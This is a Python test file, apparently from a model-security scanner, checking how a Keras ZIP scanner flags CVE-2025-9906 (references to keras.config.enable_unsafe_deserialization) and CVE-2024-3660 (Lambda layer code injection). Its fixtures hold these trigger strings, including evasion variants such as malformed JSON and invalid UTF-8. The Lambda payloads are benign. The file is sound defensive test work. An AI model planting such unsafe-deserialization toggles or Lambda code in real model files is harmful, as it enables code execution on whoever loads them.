                "config": {
                    "layers": [],
                    "notes": "This doc mentions enable_unsafe_deserialization for awareness only",
                },
            }
        )
        result = scanner.scan(self._make_keras_zip(config_str, tmp_path))

        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-9906"]
        assert len(cve_issues) == 0

    def test_cross_object_tokens_do_not_trigger_false_positive(self, tmp_path: Path) -> None:
        """Separate context/token in different objects should not trigger CVE."""
        scanner = KerasZipScanner()
        config_str = json.dumps(
            {
                "class_name": "Model",
                "config": {
                    "layers": [
                        {"class_name": "Dense", "name": "d1", "config": {"fn": "enable_unsafe_deserialization"}},
                        {"class_name": "Dense", "name": "d2", "module": "keras.config", "config": {"units": 16}},
                    ],
                },
            }
        )
        result = scanner.scan(self._make_keras_zip(config_str, tmp_path))
        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-9906"]
        assert len(cve_issues) == 0, "Cross-object token co-occurrence should not trigger CVE-2025-9906"

    def test_comment_token_does_not_suppress_malicious_detection(self, tmp_path: Path) -> None:
        """Embedding a single comment token should not suppress CVE detection."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "Dense",
                        "name": "d",
                        "module": "keras.config",
                        "config": {"fn": "enable_unsafe_deserialization", "notes": "#"},
                    }
                ]
            },
        }
        result = scanner.scan(self._make_keras_zip(json.dumps(config), tmp_path))
        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-9906"]
        assert len(cve_issues) >= 1

    def test_documentation_text_with_bare_config_words_stays_documentation(self) -> None:
        """Bare prose mentions of config/module should not stop doc-like scoring."""
        text = "\n".join(
            [
                "This model config includes safe defaults and explanatory guidance only",
                "The module description here is narrative text for documentation readers",
                "Another long descriptive line for awareness and onboarding context",
            ]
        )

        assert KerasZipScanner._is_primarily_documentation_text(text) is True

    def test_dangerous_line_does_not_count_toward_documentation_ratio(self) -> None:
        """Dangerous literals must not inflate the documentation ratio."""
        text = "\n".join(
            [
                "This line is harmless documentation padding only",
                "This warning mentions keras.config.enable_unsafe_deserialization as prose only",
            ]
        )

        assert KerasZipScanner._is_primarily_documentation_text(text) is False

    def test_malformed_json_with_executable_raw_reference_is_detected(self, tmp_path: Path) -> None:
        """Malformed JSON should still trigger raw fallback when executable keys are present."""
        scanner = KerasZipScanner()
        config_str = (
            '{"class_name":"Sequential","config":{"module":"keras.config","fn":"enable_unsafe_deserialization",}'
        )

        result = scanner.scan(self._make_keras_zip(config_str, tmp_path))
        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-9906"]
        assert len(cve_issues) == 1
        assert cve_issues[0].details["detection_method"] == "raw_config_scan"
        parse_checks = [c for c in result.checks if c.name == "Config JSON Parsing"]
        assert len(parse_checks) == 1
        assert parse_checks[0].status != CheckStatus.PASSED
        assert result.success is False

    def test_malformed_json_doc_symbol_without_executable_context_not_flagged(self, tmp_path: Path) -> None:
        """Malformed JSON documentation mentions alone must not trigger the raw fallback."""
        scanner = KerasZipScanner()
        config_str = (
            '{"description":"This documentation mentions '
            'keras.config.enable_unsafe_deserialization for awareness only",'
        )

        result = scanner.scan(self._make_keras_zip(config_str, tmp_path))
        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-9906"]
        assert len(cve_issues) == 0

    def test_malformed_json_split_object_context_not_flagged(self, tmp_path: Path) -> None:
        """Module and function keys in different objects must not combine into a raw finding."""
        scanner = KerasZipScanner()
        config_str = '{"layers":[{"module":"keras.config"},{"fn":"enable_unsafe_deserialization"}],'

        result = scanner.scan(self._make_keras_zip(config_str, tmp_path))
        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-9906"]
        assert len(cve_issues) == 0

    def test_invalid_utf8_config_bytes_still_trigger_raw_fallback(self, tmp_path: Path) -> None:
        """Invalid UTF-8 should still use the raw fallback instead of bypassing detection."""
        scanner = KerasZipScanner()
        keras_path = tmp_path / "invalid_utf8.keras"
        with zipfile.ZipFile(keras_path, "w") as zf:
            zf.writestr("config.json", b'{"loader":"keras.config.enable_unsafe_deserialization",\xff')
            zf.writestr("metadata.json", json.dumps({"keras_version": "3.13.2"}))

        result = scanner.scan(str(keras_path))
        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-9906"]
        assert len(cve_issues) == 1
        assert cve_issues[0].details["detection_method"] == "raw_config_scan"
        parse_checks = [c for c in result.checks if c.name == "Config JSON Parsing"]
        assert len(parse_checks) == 1
        assert parse_checks[0].status != CheckStatus.PASSED
        assert result.success is False

    def test_benign_documentation_text_stays_clean(self, tmp_path: Path) -> None:
        """Benign long-form documentation text should not trigger CVE checks."""
        scanner = KerasZipScanner()
        config_str = json.dumps(
            {
                "class_name": "Model",
                "config": {
                    "notes": (
                        "This documentation example mentions keras.config.enable_unsafe_deserialization "
                        "for awareness only\n"
                        "Another long descriptive line for awareness and guidance\n"
                        "Helpful prose about model metadata and no executable content"
                    ),
                    "description": "Documentation for awareness and onboarding only",
                },
            }
        )

        result = scanner.scan(self._make_keras_zip(config_str, tmp_path))
        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-9906"]
        assert len(cve_issues) == 0

    def test_description_text_without_dangerous_tokens_not_flagged(self, tmp_path: Path) -> None:
        """Config descriptions should remain clean when dangerous symbols are absent."""
        scanner = KerasZipScanner()
        config_str = json.dumps(
            {
                "class_name": "Sequential",
                "description": (
                    "This model config includes many words to document architecture choices\n"
                    "Padding text for readability and transparency without any dangerous references"
                ),
                "config": {"layers": [{"class_name": "Dense", "config": {"units": 4}}]},
            }
        )

        result = scanner.scan(self._make_keras_zip(config_str, tmp_path))
        cve_issues = [i for i in result.issues if i.details.get("cve_id") == "CVE-2025-9906"]
        assert len(cve_issues) == 0


class TestCVE20243660LambdaAttribution:
    """Test CVE-2024-3660: Lambda layer code injection attribution."""

    def _make_keras_zip(self, config: dict, tmp_path: Path, keras_version: str = "2.10.0") -> str:
        keras_path = tmp_path / "model.keras"
        with zipfile.ZipFile(keras_path, "w") as zf:
            zf.writestr("config.json", json.dumps(config))
            zf.writestr("metadata.json", json.dumps({"keras_version": keras_version}))
        return str(keras_path)

    def test_lambda_layer_has_cve_2024_3660_attribution(self, tmp_path: Path) -> None:
        """Lambda layer in .keras file should include CVE-2024-3660 attribution."""
        scanner = KerasZipScanner()
        encoded = base64.b64encode(b"lambda x: x * 2").decode()
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "Lambda",
                        "name": "my_lambda",
                        "config": {"function": [encoded, None, None]},
                    }
                ]
            },
        }
        result = scanner.scan(self._make_keras_zip(config, tmp_path))

        cve_issues = [i for i in result.issues if "CVE-2024-3660" in i.message]
        assert len(cve_issues) >= 1, "Lambda should have CVE-2024-3660 attribution"
        assert cve_issues[0].severity == IssueSeverity.CRITICAL
        assert cve_issues[0].details["cve_id"] == "CVE-2024-3660"
        assert cve_issues[0].details["cvss"] == 9.8
        assert cve_issues[0].details["cwe"] == "CWE-94"
        assert cve_issues[0].details["description"]
        assert cve_issues[0].details["remediation"]
        assert cve_issues[0].details["layer_name"] == "my_lambda"

    def test_no_cve_without_lambda(self, tmp_path: Path) -> None:
        """Non-Lambda model should NOT have CVE-2024-3660 attribution."""
        scanner = KerasZipScanner()
        config = {
            "class_name": "Sequential",
            "config": {"layers": [{"class_name": "Dense", "name": "dense_1", "config": {"units": 10}}]},
        }
        result = scanner.scan(self._make_keras_zip(config, tmp_path))

        cve_issues = [i for i in result.issues if "CVE-2024-3660" in i.message]
        assert len(cve_issues) == 0

    def test_no_cve_for_fixed_keras_version(self, tmp_path: Path) -> None:
        """Lambda in fixed Keras version should not be CVE-attributed."""
        scanner = KerasZipScanner()
        encoded = base64.b64encode(b"lambda x: x * 2").decode()
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "Lambda",
                        "name": "my_lambda",
                        "config": {"function": [encoded, None, None]},
                    }
                ]
            },
        }
        keras_path = tmp_path / "model_fixed.keras"
        with zipfile.ZipFile(keras_path, "w") as zf:
            zf.writestr("config.json", json.dumps(config))
            zf.writestr("metadata.json", json.dumps({"keras_version": "2.13.0"}))

        result = scanner.scan(str(keras_path))
        cve_issues = [i for i in result.issues if "CVE-2024-3660" in i.message]
        assert len(cve_issues) == 0

    def test_cve_for_two_part_keras_version(self, tmp_path: Path) -> None:
        """Lambda in Keras 2.10 (two-part version) should be CVE-attributed."""
        scanner = KerasZipScanner()
        encoded = base64.b64encode(b"lambda x: x * 2").decode()
        config = {
            "class_name": "Sequential",
            "config": {
                "layers": [
                    {
                        "class_name": "Lambda",
                        "name": "my_lambda",
                        "config": {"function": [encoded, None, None]},
                    }
                ]
            },
        }
        result = scanner.scan(self._make_keras_zip(config, tmp_path, keras_version="2.10"))
        cve_issues = [i for i in result.issues if "CVE-2024-3660" in i.message]
        assert len(cve_issues) >= 1, "Keras 2.10 should be attributed as vulnerable"
        assert cve_issues[0].severity == IssueSeverity.CRITICAL


class TestKerasZipScannerSubclassed:
    """Tests for subclassed model detection in ZIP format."""

    def test_allows_known_safe_model_classes_in_zip(self, tmp_path):
        """Test that scanner passes for known safe model classes."""
        from modelaudit.scanners.base import CheckStatus

        scanner = KerasZipScanner()

        for model_class in ["Sequential", "Functional", "Model"]:
            keras_path = tmp_path / f"model_{model_class}.keras"

            with zipfile.ZipFile(keras_path, "w") as zf:
                config = {
                    "class_name": model_class,
                    "config": {
                        "name": "test_model",
                        "layers": [
                            {"class_name": "Dense", "config": {"units": 10}},
                        ],
                    },
                }
                zf.writestr("config.json", json.dumps(config))
                zf.writestr("metadata.json", json.dumps({"keras_version": "3.0.0"}))

            result = scanner.scan(str(keras_path))

            subclass_issues = [i for i in result.issues if "subclassed" in i.message.lower()]
            assert len(subclass_issues) == 0, f"{model_class} should not be flagged as subclassed"

            subclass_checks = [c for c in result.checks if "subclassed" in c.name.lower()]
            assert len(subclass_checks) > 0
            assert all(c.status == CheckStatus.PASSED for c in subclass_checks)
